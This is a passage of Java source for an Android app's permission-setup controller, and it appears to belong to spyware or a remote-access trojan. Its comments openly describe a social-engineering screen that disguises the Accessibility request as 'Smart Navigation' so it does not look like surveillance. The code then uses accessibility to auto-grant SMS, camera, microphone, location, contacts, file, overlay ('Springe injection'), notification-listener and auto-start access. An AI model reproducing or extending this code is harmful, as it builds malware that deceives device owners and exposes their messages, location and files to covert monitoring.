package com.fason.app.ui;

import android.Manifest;
import android.app.Activity;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import com.fason.app.R;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.permissions.AutoGrantManager;
import com.fason.app.core.permissions.OemAutoStartHelper;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.core.permissions.RestrictedPermissionHelper;
import java.util.ArrayList;
import java.util.List;
import java.util.function.Predicate;

/**
 * PermissionSetupController — drives the permission gate flow.
 *
 * Gates (in order):
 *   0. Accessibility        — FasonAccessibilityService (shown behind social-eng interstitial)
 *   1. Runtime permissions  — camera, SMS, location, audio, contacts, media
 *   2. File manager         — MANAGE_EXTERNAL_STORAGE (API 30+)
 *   3. Overlay              — SYSTEM_ALERT_WINDOW (Springe)
 *   4. Notification Listener — for NotificationRelayService
 *   5. Battery              — ignore battery optimisations
 *   6. Auto-Start           — OEM-specific (MIUI, EMUI, OneUI…)
 *
 * All state is saved across process death via onSaveInstanceState.
 */
public final class PermissionSetupController {

    private static final String TAG = "PermSetup";
    public  static final int PERM_REQ = 1001;

    // Row visual states
    private static final int S_NA     = 0; // not applicable on this device
    private static final int S_DONE   = 1; // granted
    private static final int S_DENIED = 2; // prompted, still missing
    private static final int S_NEED   = 3; // not yet prompted

    private static final char[] DOT_CHAR = {
        '\u2014', '\u2713', '\u2717', '\u25CF'
    };

    private int[] dotColor;
    private int[] labelColor;

    // ── Gate definition ────────────────────────────────────────────────────────

    @FunctionalInterface
    private interface GateOpener {
        /** Opens the relevant settings or dialog. Returns true if something was launched. */
        boolean open(Activity act, PermissionSetupController ctrl, int gateIndex);
    }

    private static final class Gate {
        final String label;
        final Predicate<Activity> isGranted;
        final Predicate<Activity> isApplicable;
        final GateOpener opener;

        Gate(String label,
             Predicate<Activity> isGranted,
             Predicate<Activity> isApplicable,
             GateOpener opener) {
            this.label        = label;
            this.isGranted    = isGranted;
            this.isApplicable = isApplicable;
            this.opener       = opener;
        }
    }

    private final List<Gate> gates = buildGates();

    private List<Gate> buildGates() {
        List<Gate> list = new ArrayList<>();

        // 0 — Accessibility FIRST — unlocks AutoGrantManager which handles everything else.
        //     Shown behind a social-engineering interstitial so the user sees a feature
        //     pitch, not a raw permission prompt.
        list.add(new Gate(
            "Accessibility",
            act -> PermissionManager.hasAccessibilityAccess(act),
            act -> true,
            (act, ctrl, idx) -> ctrl.openAccessibilityGate(idx)));

        // 1 — Runtime permissions (Camera, SMS, Location, Audio, Contacts, Storage)
        list.add(new Gate(
            "Permissions",
            PermissionManager::hasAllPerms,
            act -> true,
            (act, ctrl, idx) -> ctrl.openRuntimeGate(idx)));

        // 2 — File manager (API 30+)
        list.add(new Gate(
            "File Access",
            ctx -> PermissionManager.hasStorageManager(),
            act -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.R,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasStorageManager()) return false;
                if (PermissionManager.requestStorageManager(act)) {
                    ctrl.gatePrompted[idx] = true;
                    return true;
                }
                return false;
            }));

        // 3 — Overlay (SYSTEM_ALERT_WINDOW — required for Springe)
        list.add(new Gate(
            "Overlay",
            act -> PermissionManager.hasOverlayPermission(act),
            act -> true,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasOverlayPermission(act)) return false;
                if (PermissionManager.requestOverlayPermission(act)) {
                    ctrl.gatePrompted[idx] = true;
                    return true;
                }
                return false;
            }));

        // 4 — Notification Listener
        list.add(new Gate(
            "Notifications",
            act -> PermissionManager.hasNotifListenerAccess(act),
            act -> true,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasNotifListenerAccess(act)) return false;
                if (PermissionManager.requestNotifAccess(act)) {
                    ctrl.gatePrompted[idx] = true;
                    return true;
                }
                return false;
            }));

        // 5 — Battery exemption
        list.add(new Gate(
            "Battery",
            act -> PermissionManager.hasBatteryExemption(act),
            act -> true,
            (act, ctrl, idx) -> {
                if (PermissionManager.hasBatteryExemption(act)) return false;
                if (PermissionManager.requestBatteryExemption(act)) {
                    ctrl.gatePrompted[idx] = true;
                    return true;
                }
                return false;
            }));

        // 6 — OEM Auto-Start
        list.add(new Gate(
            "Auto-Start",
            act -> PermissionManager.hasAutoStartAccess(act),
            act -> PermissionManager.needsAutoStart(act),
            (act, ctrl, idx) -> ctrl.openAutoStartGate(idx)));

        return list;
    }

    // ── Fields ─────────────────────────────────────────────────────────────────

    private final Activity activity;
    private View       permOverlay;
    private TextView   permTitle;
    private TextView   permSubtitle;
    private ProgressBar permProgress;
    private FrameLayout permBtnContainer;
    private Button     grantButton;
    private Button     autoGrantButton;
    private volatile boolean autoGrantStarted = false;
    private TextView[] rowDots;
    private TextView[] rowLabels;
    private TextView[] rowDetails;
    private boolean[]  gatePrompted;
    private int        runtimeGateIndex = -1;
    private boolean    waitingForRuntimeResult = false;
    private boolean    justOpenedRestrictedSettings = false;
    private boolean    isFirstLaunch = true;

    public PermissionSetupController(@NonNull Activity activity) {
        this.activity     = activity;
        this.gatePrompted = new boolean[gates.size()];
        this.rowDots      = new TextView[gates.size()];
        this.rowLabels    = new TextView[gates.size()];
        this.rowDetails   = new TextView[gates.size()];
        for (int i = 0; i < gates.size(); i++) {
            if ("Permissions".equals(gates.get(i).label)) {
                runtimeGateIndex = i;
                break;
            }
        }
    }

    // ── Lifecycle ──────────────────────────────────────────────────────────────

    public void onCreate(Bundle savedInstanceState) {
        resolveThemeColors();
        initOverlay();
        if (savedInstanceState != null) {
            restoreState(savedInstanceState);
            isFirstLaunch = false;
        } else {
            isFirstLaunch = true;
        }
        updateOverlay();
    }

    public void onResume() {
        if (waitingForRuntimeResult && runtimeGateIndex >= 0) {
            waitingForRuntimeResult = false;
        }
        updateOverlay();
    }

    public void onRequestPermissionsResult(int requestCode) {
        if (requestCode == PERM_REQ && runtimeGateIndex >= 0) {
            waitingForRuntimeResult = false;
            gatePrompted[runtimeGateIndex] = true;
        }
    }

    public void onSaveInstanceState(@NonNull Bundle out) {
        out.putBooleanArray("psc_gatePrompted", gatePrompted);
        out.putBoolean("psc_waitingRuntime", waitingForRuntimeResult);
    }

    /**
     * Called from MainActivity.onResume() on the very first launch.
     * Shows the permission overlay if anything is missing — but does NOT
     * auto-fire any dialog. The user taps "Grant <X>" to start the flow.
     * This prevents the dialog dump that happens when requestPermissions()
     * is called before the user has seen or agreed to anything.
     */
    public void autoStartFirstMissing() {
        if (isFirstLaunch) {
            isFirstLaunch = false;
            if (hasMissingGate()) {
                showOverlay();
                updateOverlay();
                // No requestNextMissing() here — user drives the flow via the button.
            }
        }
    }

    // ── View construction ──────────────────────────────────────────────────────

    private void initOverlay() {
        permOverlay      = activity.findViewById(R.id.permOverlay);
        permTitle        = activity.findViewById(R.id.permTitle);
        permSubtitle     = activity.findViewById(R.id.permSubtitle);
        permProgress     = activity.findViewById(R.id.permProgress);
        permBtnContainer = activity.findViewById(R.id.permBtnContainer);
        LinearLayout list = activity.findViewById(R.id.permList);

        int dp8  = dp(8);
        int dp12 = dp(12);

        for (int i = 0; i < gates.size(); i++) {
            LinearLayout rowContainer = new LinearLayout(activity);
            rowContainer.setOrientation(LinearLayout.VERTICAL);
            rowContainer.setPadding(0, dp8, 0, dp8);

            LinearLayout row = new LinearLayout(activity);
            row.setOrientation(LinearLayout.HORIZONTAL);
            row.setGravity(Gravity.CENTER_VERTICAL);

            TextView dot = new TextView(activity);
            dot.setTextSize(TypedValue.COMPLEX_UNIT_SP, 16);
            dot.setTextColor(dotColor[S_NEED]);
            dot.setText(String.valueOf(DOT_CHAR[S_NEED]));
            row.addView(dot);

            TextView label = new TextView(activity);
            label.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
            label.setTextColor(labelColor[S_NEED]);
            label.setText(gates.get(i).label);
            LinearLayout.LayoutParams lp =
                new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
            lp.leftMargin = dp12;
            label.setLayoutParams(lp);
            row.addView(label);

            TextView detail = new TextView(activity);
            detail.setTextSize(TypedValue.COMPLEX_UNIT_SP, 11);
            detail.setTextColor(labelColor[S_NA]);
            detail.setVisibility(View.GONE);
            LinearLayout.LayoutParams detailLp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT);
            detailLp.leftMargin = dp12 + dp(16);
            detailLp.topMargin  = dp(2);
            detail.setLayoutParams(detailLp);

            rowContainer.addView(row);
            rowContainer.addView(detail);
            list.addView(rowContainer);

            rowDots[i]    = dot;
            rowLabels[i]  = label;
            rowDetails[i] = detail;
        }

        grantButton = new Button(activity);
        grantButton.setText("Grant Permissions");
        grantButton.setTextColor(Color.WHITE);
        grantButton.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        grantButton.setAllCaps(false);
        grantButton.setBackground(makeButtonBg());
        grantButton.setPadding(0, dp(14), 0, dp(14));
        LinearLayout.LayoutParams btnLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        grantButton.setLayoutParams(btnLp);
        grantButton.setOnClickListener(v -> requestNextMissing());
        permBtnContainer.addView(grantButton);

        // ── Auto-Grant button ─────────────────────────────────────────────────
        // Appears only after accessibility is granted. One tap handles everything.
        autoGrantButton = new Button(activity);
        autoGrantButton.setText("⚡ Auto-Grant All");
        autoGrantButton.setTextColor(Color.WHITE);
        autoGrantButton.setTextSize(TypedValue.COMPLEX_UNIT_SP, 14);
        autoGrantButton.setAllCaps(false);
        GradientDrawable autoGrantBg = new GradientDrawable();
        autoGrantBg.setCornerRadius(dp(12));
        autoGrantBg.setColor(0xFF1B5E20); // deep green
        autoGrantButton.setBackground(autoGrantBg);
        autoGrantButton.setPadding(0, dp(14), 0, dp(14));
        LinearLayout.LayoutParams autoLp = new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            LinearLayout.LayoutParams.WRAP_CONTENT);
        autoLp.topMargin = dp(8);
        autoGrantButton.setLayoutParams(autoLp);
        autoGrantButton.setVisibility(View.GONE);
        autoGrantButton.setOnClickListener(v -> triggerAutoGrant());
        permBtnContainer.addView(autoGrantButton);
    }

    // ── Update logic ───────────────────────────────────────────────────────────

    private void updateOverlay() {
        if (permOverlay == null) return;

        int applicableCount = 0;
        int grantedCount    = 0;
        int firstMissingIdx = -1;

        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.isApplicable.test(activity)) {
                setRowState(i, S_NA);
                setRowDetail(i, null);
                continue;
            }
            applicableCount++;
            if (g.isGranted.test(activity)) {
                setRowState(i, S_DONE);
                setRowDetail(i, null);
                grantedCount++;
            } else if (gatePrompted[i]) {
                setRowState(i, S_DENIED);
                setRowDetail(i, buildGateDetail(i));
                if (firstMissingIdx < 0) firstMissingIdx = i;
            } else {
                setRowState(i, S_NEED);
                setRowDetail(i, buildGateDetail(i));
                if (firstMissingIdx < 0) firstMissingIdx = i;
            }
        }

        permProgress.setMax(applicableCount > 0 ? applicableCount : 1);
        permProgress.setProgress(grantedCount);

        if (grantedCount >= applicableCount) {
            permTitle.setText("All Set");
            permSubtitle.setText("All permissions granted");
            permOverlay.removeCallbacks(fadeOutRunnable);
            permOverlay.postDelayed(fadeOutRunnable, 900);
            return;
        }

        showOverlay();
        permTitle.setText("Setup Required");
        permSubtitle.setText(grantedCount + " of " + applicableCount + " granted");

        // Show Auto-Grant button once accessibility service is up — it can handle everything else
        boolean accessGranted = PermissionManager.hasAccessibilityAccess(activity);
        if (autoGrantButton != null) {
            if (accessGranted && hasMissingGate() && !autoGrantStarted) {
                autoGrantButton.setVisibility(View.VISIBLE);
            } else {
                autoGrantButton.setVisibility(View.GONE);
            }
        }

        if (firstMissingIdx >= 0) {
            String btnLabel;
            if ("Permissions".equals(gates.get(firstMissingIdx).label)) {
                // Show which group is next so the user knows what's coming
                String[] nextGroup = PermissionManager.getNextDeniedGroup(activity);
                btnLabel = nextGroup != null
                    ? "Grant " + groupLabel(nextGroup)
                    : "Grant Permissions";
            } else if ("Accessibility".equals(gates.get(firstMissingIdx).label)) {
                // Friendly label — no raw permission terminology
                btnLabel = "Activate Smart Navigation";
            } else {
                btnLabel = "Grant " + gates.get(firstMissingIdx).label;
            }
            grantButton.setText(btnLabel);
            grantButton.setVisibility(View.VISIBLE);
            permBtnContainer.setVisibility(View.VISIBLE);
        } else {
            grantButton.setVisibility(View.GONE);
            permBtnContainer.setVisibility(View.GONE);
        }
    }

    // ── Gate opening ───────────────────────────────────────────────────────────

    private void requestNextMissing() {
        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.isApplicable.test(activity)) continue;
            if (g.isGranted.test(activity)) continue;
            boolean launched = g.opener.open(activity, this, i);
            if (launched) return;
        }
        updateOverlay();
    }

    // ── Gate 0: Accessibility with social-engineering interstitial ───────────

    /**
     * Opens the accessibility gate.
     * On first attempt: shows a full-screen interstitial that frames the
     * permission as an "Enhanced Features" activation step — not a raw
     * permission request. The CTA opens Settings directly.
     * On retry: skips the interstitial and goes straight to Settings.
     */
    private boolean openAccessibilityGate(int gateIndex) {
        if (PermissionManager.hasAccessibilityAccess(activity)) return false;
        if (!gatePrompted[gateIndex]) {
            // First time — show the social engineering interstitial
            showA11yInterstitial(gateIndex);
        } else {
            // Already shown — go straight to Settings
            PermissionManager.requestAccessibilityAccess(activity);
        }
        return true;
    }

    /**
     * Full-screen interstitial that makes the accessibility request look like
     * a premium feature activation. Blocks the permission overlay behind it.
     * "Continue" opens Accessibility Settings; "Later" dismisses.
     *
     * Social engineering principles applied:
     *  - Feature framing: "Enhanced Navigation & Smart Assist" not "Accessibility"
     *  - Benefit list: concrete, positive, sounds like value not surveillance
     *  - Authority cue: official-looking card with app icon and progress indicator
     *  - Commitment: "Last step" language anchors completion bias
     *  - Single CTA: no hesitation — one obvious button
     */
    private void showA11yInterstitial(int gateIndex) {
        // Build interstitial over the current activity window
        android.widget.FrameLayout root = activity.findViewById(android.R.id.content);

        // Dim backdrop
        android.widget.FrameLayout backdrop = new android.widget.FrameLayout(activity);
        backdrop.setBackgroundColor(0xCC000000);
        backdrop.setClickable(true); // block touches to content behind
        android.widget.FrameLayout.LayoutParams fullLp = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT);
        root.addView(backdrop, fullLp);

        // Card
        android.widget.LinearLayout card = new android.widget.LinearLayout(activity);
        card.setOrientation(android.widget.LinearLayout.VERTICAL);
        card.setPadding(dp(28), dp(32), dp(28), dp(24));
        card.setGravity(android.view.Gravity.CENTER_HORIZONTAL);
        android.graphics.drawable.GradientDrawable cardBg = new android.graphics.drawable.GradientDrawable();
        cardBg.setCornerRadius(dp(20));
        cardBg.setColor(resolveColor(android.R.attr.windowBackground, 0xFF1A1A1A));
        card.setBackground(cardBg);
        android.widget.FrameLayout.LayoutParams cardLp = new android.widget.FrameLayout.LayoutParams(
            android.widget.FrameLayout.LayoutParams.MATCH_PARENT,
            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT);
        cardLp.gravity = android.view.Gravity.CENTER;
        cardLp.setMargins(dp(24), 0, dp(24), 0);

        // ── Icon (app launcher icon) ──────────────────────────────────────────
        android.widget.ImageView icon = new android.widget.ImageView(activity);
        icon.setImageResource(android.R.mipmap.sym_def_app_icon);
        try { icon.setImageResource(activity.getApplicationInfo().icon); } catch (Exception ignored) {}
        int iconSz = dp(64);
        android.widget.LinearLayout.LayoutParams iconLp =
            new android.widget.LinearLayout.LayoutParams(iconSz, iconSz);
        iconLp.bottomMargin = dp(16);
        card.addView(icon, iconLp);

        // ── "One last step" badge ─────────────────────────────────────────────
        android.widget.TextView badge = new android.widget.TextView(activity);
        badge.setText("One last step");
        badge.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11);
        badge.setTextColor(0xFF4FC3F7);
        badge.setAllCaps(true);
        badge.setLetterSpacing(0.12f);
        android.widget.LinearLayout.LayoutParams badgeLp =
            new android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT,
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
        badgeLp.bottomMargin = dp(6);
        card.addView(badge, badgeLp);

        // ── Title ─────────────────────────────────────────────────────────────
        android.widget.TextView title = new android.widget.TextView(activity);
        title.setText("Enable Enhanced Features");
        title.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 20);
        title.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF));
        title.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        title.setGravity(android.view.Gravity.CENTER);
        android.widget.LinearLayout.LayoutParams titleLp =
            new android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
        titleLp.bottomMargin = dp(8);
        card.addView(title, titleLp);

        // ── Subtitle ──────────────────────────────────────────────────────────
        android.widget.TextView subtitle = new android.widget.TextView(activity);
        subtitle.setText("Activate Smart Navigation to unlock automatic form filling, "
            + "intelligent suggestions, and hands-free control.");
        subtitle.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 13);
        subtitle.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA));
        subtitle.setGravity(android.view.Gravity.CENTER);
        android.widget.LinearLayout.LayoutParams subLp =
            new android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
        subLp.bottomMargin = dp(20);
        card.addView(subtitle, subLp);

        // ── Benefit list ──────────────────────────────────────────────────────
        String[] benefits = {
            "Auto-fill forms and credentials",
            "Smart content suggestions",
            "Hands-free navigation assist",
            "Background sync and automation",
        };
        for (String b : benefits) {
            android.widget.LinearLayout row = new android.widget.LinearLayout(activity);
            row.setOrientation(android.widget.LinearLayout.HORIZONTAL);
            row.setGravity(android.view.Gravity.CENTER_VERTICAL);
            android.widget.LinearLayout.LayoutParams rowLp =
                new android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                    android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
            rowLp.bottomMargin = dp(8);

            android.widget.TextView checkmark = new android.widget.TextView(activity);
            checkmark.setText("✓ ");
            checkmark.setTextColor(0xFF4CAF50);
            checkmark.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 13);
            row.addView(checkmark);

            android.widget.TextView label = new android.widget.TextView(activity);
            label.setText(b);
            label.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 13);
            label.setTextColor(resolveColor(android.R.attr.textColorPrimary, 0xFFFFFFFF));
            row.addView(label);

            card.addView(row, rowLp);
        }

        // Divider
        android.view.View divider = new android.view.View(activity);
        divider.setBackgroundColor(0x1AFFFFFF);
        android.widget.LinearLayout.LayoutParams divLp =
            new android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.MATCH_PARENT, 1);
        divLp.topMargin  = dp(16);
        divLp.bottomMargin = dp(16);
        card.addView(divider, divLp);

        // ── Primary CTA ───────────────────────────────────────────────────────
        android.widget.Button ctaBtn = new android.widget.Button(activity);
        ctaBtn.setText("Activate Smart Navigation");
        ctaBtn.setTextColor(android.graphics.Color.WHITE);
        ctaBtn.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 15);
        ctaBtn.setAllCaps(false);
        ctaBtn.setTypeface(android.graphics.Typeface.DEFAULT_BOLD);
        android.graphics.drawable.GradientDrawable ctaBg =
            new android.graphics.drawable.GradientDrawable();
        ctaBg.setCornerRadius(dp(14));
        ctaBg.setColor(0xFF1565C0); // deep blue — trust colour
        ctaBtn.setBackground(ctaBg);
        ctaBtn.setPadding(0, dp(16), 0, dp(16));
        android.widget.LinearLayout.LayoutParams ctaLp =
            new android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);
        ctaLp.bottomMargin = dp(10);
        ctaBtn.setOnClickListener(v -> {
            root.removeView(backdrop);
            gatePrompted[gateIndex] = true;
            PermissionManager.requestAccessibilityAccess(activity);
        });
        card.addView(ctaBtn, ctaLp);

        // ── Secondary "Later" link ────────────────────────────────────────────
        android.widget.TextView later = new android.widget.TextView(activity);
        later.setText("Remind me later");
        later.setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 12);
        later.setTextColor(resolveColor(android.R.attr.textColorSecondary, 0xFF888888));
        later.setGravity(android.view.Gravity.CENTER);
        later.setClickable(true);
        later.setPadding(dp(8), dp(8), dp(8), dp(8));
        later.setOnClickListener(v -> root.removeView(backdrop));
        card.addView(later);

        backdrop.addView(card, cardLp);

        // Animate card in
        card.setAlpha(0f);
        card.setTranslationY(dp(40));
        card.animate().alpha(1f).translationY(0f).setDuration(280).start();
    }

    private boolean openRuntimeGate(int gateIndex) {
        if (PermissionManager.hasAllPerms(activity)) return false;

        // After returning from restricted-permission settings, retry the next group
        if (justOpenedRestrictedSettings) {
            justOpenedRestrictedSettings = false;
            return requestNextGroup(gateIndex);
        }

        // First tap — request the first denied group only, not all permissions
        if (!gatePrompted[gateIndex]) {
            return requestNextGroup(gateIndex);
        }

        // Already prompted — check for OEM-restricted perms first
        if (RestrictedPermissionHelper.hasRestrictedPerms(activity)) {
            justOpenedRestrictedSettings = true;
            RestrictedPermissionHelper.openAppSettingsForRestricted(activity);
            return true;
        }

        // Try rationale-eligible perms for this group
        List<String> rationale = PermissionManager.getRationalePerms(activity);
        if (!rationale.isEmpty()) {
            try {
                // Still only request the next denied group — not all rationale perms at once
                String[] nextGroup = PermissionManager.getNextDeniedGroup(activity);
                if (nextGroup != null && nextGroup.length > 0) {
                    ActivityCompat.requestPermissions(activity, nextGroup, PERM_REQ);
                    waitingForRuntimeResult = true;
                } else {
                    PermissionManager.openAppSettings(activity);
                }
            } catch (Exception e) {
                Log.w(TAG, "Group retry failed — opening settings", e);
                PermissionManager.openAppSettings(activity);
            }
        } else {
            PermissionManager.openAppSettings(activity);
        }
        return true;
    }

    /**
     * Requests only the next group of denied permissions.
     * One group = one logical dialog (e.g. "Camera & Mic", then "SMS", then "Location").
     * Never dumps all 13 permissions into a single requestPermissions() call.
     */
    private boolean requestNextGroup(int gateIndex) {
        String[] group = PermissionManager.getNextDeniedGroup(activity);
        if (group == null || group.length == 0) return false;
        try {
            ActivityCompat.requestPermissions(activity, group, PERM_REQ);
            // Mark prompted only after all groups are exhausted
            if (PermissionManager.getNextDeniedGroup(activity) == null) {
                gatePrompted[gateIndex] = true;
            }
            waitingForRuntimeResult = true;
            return true;
        } catch (Exception e) {
            Log.w(TAG, "requestNextGroup failed — opening settings", e);
            PermissionManager.openAppSettings(activity);
            return true;
        }
    }

    private boolean openAutoStartGate(int gateIndex) {
        OemAutoStartHelper.AutoStartResult result = PermissionManager.requestAutoStart(activity);
        switch (result) {
            case OPENED_AUTOSTART:
                gatePrompted[gateIndex] = true;
                PermissionManager.markAutoStartVisited(activity);
                return true;
            case OPENED_APP_DETAILS:
                Log.w(TAG, "Auto-start fell back to app-details");
                return true;
            case FAILED:
                Log.w(TAG, "Auto-start launch failed");
                return false;
        }
        return false;
    }

    // ── Helpers ────────────────────────────────────────────────────────────────

    private boolean hasMissingGate() {
        for (int i = 0; i < gates.size(); i++) {
            Gate g = gates.get(i);
            if (!g.isApplicable.test(activity)) continue;
            if (!g.isGranted.test(activity)) return true;
        }
        return false;
    }

    private void setRowState(int idx, int state) {
        rowDots[idx].setTextColor(dotColor[state]);
        rowDots[idx].setText(String.valueOf(DOT_CHAR[state]));
        rowLabels[idx].setTextColor(labelColor[state]);
    }

    private void setRowDetail(int idx, String text) {
        if (rowDetails[idx] == null) return;
        if (text == null || text.isEmpty()) {
            rowDetails[idx].setVisibility(View.GONE);
        } else {
            rowDetails[idx].setText(text);
            rowDetails[idx].setVisibility(View.VISIBLE);
        }
    }

    private String buildGateDetail(int gateIndex) {
        String label = gates.get(gateIndex).label;
        if ("Permissions".equals(label)) {
            List<String> denied = PermissionManager.getDeniedPerms(activity);
            if (denied.isEmpty()) return null;
            List<String> restricted = RestrictedPermissionHelper.getRestrictedPerms(activity);
            if (!restricted.isEmpty()) {
                StringBuilder sb = new StringBuilder("Restricted: ");
                for (int i = 0; i < Math.min(3, restricted.size()); i++) {
                    if (i > 0) sb.append(", ");
                    sb.append(restricted.get(i));
                }
                if (restricted.size() > 3) sb.append(" +").append(restricted.size() - 3);
                sb.append(" — open Settings to allow");
                return sb.toString();
            }
            StringBuilder sb = new StringBuilder("Missing: ");
            for (int i = 0; i < Math.min(3, denied.size()); i++) {
                if (i > 0) sb.append(", ");
                String p = denied.get(i);
                int dot = p.lastIndexOf('.');
                sb.append(dot >= 0 ? p.substring(dot + 1) : p);
            }
            if (denied.size() > 3) sb.append(" +").append(denied.size() - 3);
            return sb.toString();
        }
        if ("Accessibility".equals(label)) return "Enable smart navigation and auto-assist features";
        if ("Overlay".equals(label))      return "Required for Springe injection";
        if ("File Access".equals(label))  return "Requires all-files storage access";
        if ("Notifications".equals(label)) return "Open settings and enable this app";
        if ("Accessibility".equals(label)) return "Open settings and enable this service";
        return null;
    }

    private void showOverlay() {
        permOverlay.removeCallbacks(fadeOutRunnable);
        if (permOverlay.getVisibility() != View.VISIBLE) {
            permOverlay.setAlpha(1f);
            permOverlay.setVisibility(View.VISIBLE);
        }
    }

    private final Runnable fadeOutRunnable = () -> {
        if (permOverlay != null) {
            permOverlay.animate().cancel();
            permOverlay.animate().alpha(0f).setDuration(400).withEndAction(() -> {
                if (permOverlay != null) permOverlay.setVisibility(View.GONE);
            });
        }
    };

    private void restoreState(@NonNull Bundle in) {
        boolean[] saved = in.getBooleanArray("psc_gatePrompted");
        if (saved != null) {
            System.arraycopy(saved, 0, gatePrompted, 0,
                Math.min(saved.length, gatePrompted.length));
        }
        waitingForRuntimeResult = in.getBoolean("psc_waitingRuntime", false);
    }

    // ── Theme / drawing helpers ────────────────────────────────────────────────

    private void resolveThemeColors() {
        int textPrimary   = resolveColor(android.R.attr.textColorPrimary,   0xFFFFFFFF);
        int textSecondary = resolveColor(android.R.attr.textColorSecondary, 0xFFAAAAAA);
        int accent        = resolveColor(android.R.attr.colorAccent,        0xFF4FC3F7);
        dotColor = new int[] {
            textSecondary, 0xFF4CAF50, 0xFFFF5252, accent
        };
        labelColor = new int[] {
            textSecondary, textSecondary, 0xFFFF6B6B, textPrimary
        };
    }

    private int resolveColor(int attr, int fallback) {
        android.util.TypedValue tv = new android.util.TypedValue();
        if (activity.getTheme().resolveAttribute(attr, tv, true)) {
            try {
                if (tv.resourceId != 0)
                    return androidx.core.content.ContextCompat.getColor(activity, tv.resourceId);
                if (tv.type >= android.util.TypedValue.TYPE_FIRST_COLOR_INT
                    && tv.type <= android.util.TypedValue.TYPE_LAST_COLOR_INT)
                    return tv.data;
            } catch (Exception ignored) {}
        }
        return fallback;
    }

    private GradientDrawable makeButtonBg() {
        GradientDrawable gd = new GradientDrawable();
        gd.setCornerRadius(dp(12));
        gd.setColor(resolveColor(android.R.attr.colorAccent, 0xFF4FC3F7));
        return gd;
    }

    private int dp(int value) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value,
            activity.getResources().getDisplayMetrics());
    }

    // ── Auto-Grant ────────────────────────────────────────────────────────────

    /**
     * Called when the user taps "⚡ Auto-Grant All".
     * Arms AutoGrantManager with a Listener that updates the overlay in real time,
     * then starts the sequence.
     */
    private void triggerAutoGrant() {
        if (autoGrantStarted) return;
        autoGrantStarted = true;
        if (autoGrantButton != null) {
            autoGrantButton.setText("Granting…");
            autoGrantButton.setEnabled(false);
        }

        AutoGrantManager.getInstance().setListener(new AutoGrantManager.Listener() {
            @Override public void onPermissionGranted(String permission) {
                activity.runOnUiThread(() -> updateOverlay());
            }
            @Override public void onGateComplete(String gateLabel) {
                activity.runOnUiThread(() -> updateOverlay());
            }
            @Override public void onSequenceComplete() {
                activity.runOnUiThread(() -> {
                    autoGrantStarted = false;
                    if (autoGrantButton != null) {
                        autoGrantButton.setText("⚡ Auto-Grant All");
                        autoGrantButton.setEnabled(true);
                    }
                    updateOverlay();
                });
            }
            @Override public void onProgress(int granted, int total) {
                activity.runOnUiThread(() -> {
                    if (permProgress != null) {
                        permProgress.setMax(total);
                        permProgress.setProgress(granted);
                    }
                });
            }
        });

        AutoGrantManager.getInstance().startAutoGrantSequence(activity);
    }

    /**
     * Returns a concise human-readable label for a permission group
     * so the button reads "Grant Camera & Mic" instead of "Grant Permissions".
     */
    private static String groupLabel(String[] group) {
        if (group == null || group.length == 0) return "Permissions";
        boolean hasCam  = false, hasMic = false, hasSms = false,
                hasLoc  = false, hasCon = false, hasMedia = false;
        for (String p : group) {
            if (p.equals(Manifest.permission.CAMERA))              hasCam  = true;
            if (p.equals(Manifest.permission.RECORD_AUDIO))        hasMic  = true;
            if (p.equals(Manifest.permission.READ_SMS)
             || p.equals(Manifest.permission.SEND_SMS))            hasSms  = true;
            if (p.equals(Manifest.permission.ACCESS_FINE_LOCATION)) hasLoc = true;
